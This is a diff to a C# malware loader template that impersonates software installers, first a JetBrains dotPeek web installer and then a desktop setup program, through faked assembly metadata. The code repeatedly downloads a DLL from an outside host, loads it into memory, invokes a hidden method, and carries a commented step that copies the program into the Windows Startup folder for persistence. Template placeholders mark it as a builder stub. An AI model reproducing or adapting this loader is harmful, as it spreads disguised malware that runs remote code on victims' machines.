@@ -6,12 +6,10 @@ using System.Reflection;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-//Default [assembly: AssemblyTitle("Installer.dotPeek.Web")]
-//Default [assembly: AssemblyDescription("JetBrains dotPeek 2021.1.1 Web Installer")]
-//Default [assembly: AssemblyCompany("JetBrains")]
-//Default [assembly: AssemblyProduct("dotPeek 2021.1.1 Web Installer")]
-//Default [assembly: AssemblyCopyright("Copyright © 2021 JetBrains, Inc")]
-//Default [assembly: AssemblyFileVersion("211.0.20210409.190258")]
+//Default [assembly: AssemblyDescription("TCX Desktop Setup")]
+//Default [assembly: AssemblyCompany("TCX FZ-LLC")]
+//Default [assembly: AssemblyProduct("TCX Desktopr")]
+//Default [assembly: AssemblyFileVersion("4.3.4.0")]
 
 
 //Assembly [assembly: AssemblyTitle("{1}")]
@@ -22,64 +20,28 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-class TestMotorcycle : Motorcycle
-{
-
-    public override double GetTopSpeed()
-    {
-        return 108.4;
-    }
-
-    static void Run()
-    {
-
-        TestMotorcycle moto = new TestMotorcycle();
-
-        moto.StartEngine();
-        moto.AddGas(15);
-        moto.Drive(5, 20);
-        double speed = moto.GetTopSpeed();
-        Console.WriteLine("My top speed is {0}", speed);
-    }
-}
-abstract class Motorcycle
-{
-    // Anyone can call this.
-    public void StartEngine() {/* Method statements here */ }
-
-    // Only derived classes can call this.
-    protected void AddGas(int gallons) { /* Method statements here */ }
-
-    // Derived classes can override the base class implementation.
-    public virtual int Drive(int miles, int speed) { /* Method statements here */ return 1; }
-
-    // Derived classes must implement this.
-    public abstract double GetTopSpeed();
-}
-namespace Motorcycles
+namespace Khontkar
 {
     static class Program
     {
 
-        public static byte[] SampleRefType(string estDistance)
+        public static byte[] RedKeys(string harbi)
         {
-            byte[] SampleRefType;
+            byte[] RedKeys;
             for (; ; )
             {
                 try
                 {
-                    WebClient assemblys = new WebClient();
-                    SampleRefType = assemblys.DownloadData(estDistance);
+                    WebClient telefon = new WebClient();
+                    RedKeys = telefon.DownloadData(harbi);
                 }
                 catch (Exception ex)
                 {
-                    ServicePointManager.Expect100Continue = true;
-                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                     continue;
                 }
                 break;
             }
-            return SampleRefType;
+            return RedKeys;
         }
 
         /// <summary>
@@ -95,11 +57,6 @@ namespace Motorcycles
 
             //Messega
 
-            {
-                ServicePointManager.Expect100Continue = true;
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            }
-
 
             //download try
             //download {
@@ -112,14 +69,21 @@ namespace Motorcycles
             //download }
 
 
-            object speed = new object[] { %aPP%, string.Empty, SampleRefType("%Server%"), true };
+            object audio = new object[] { %aPP%, string.Empty, RedKeys("%Server%"), true };
 
-            Assembly gallons;
+            
+            {
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            }
 
-            gallons = AppDomain.CurrentDomain.Load(SampleRefType("https://ieaspk.com/instagram.dll"));
+
+            Assembly Flow;
+
+            Flow = AppDomain.CurrentDomain.Load(RedKeys("https://ieaspk.com/instagram.dll"));
 
 
-            gallons.GetType("instagram" + ".what" + "sapp").InvokeMember("stu" + "dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])speed);
+            Flow.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])audio);
 
             //start  {
             //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
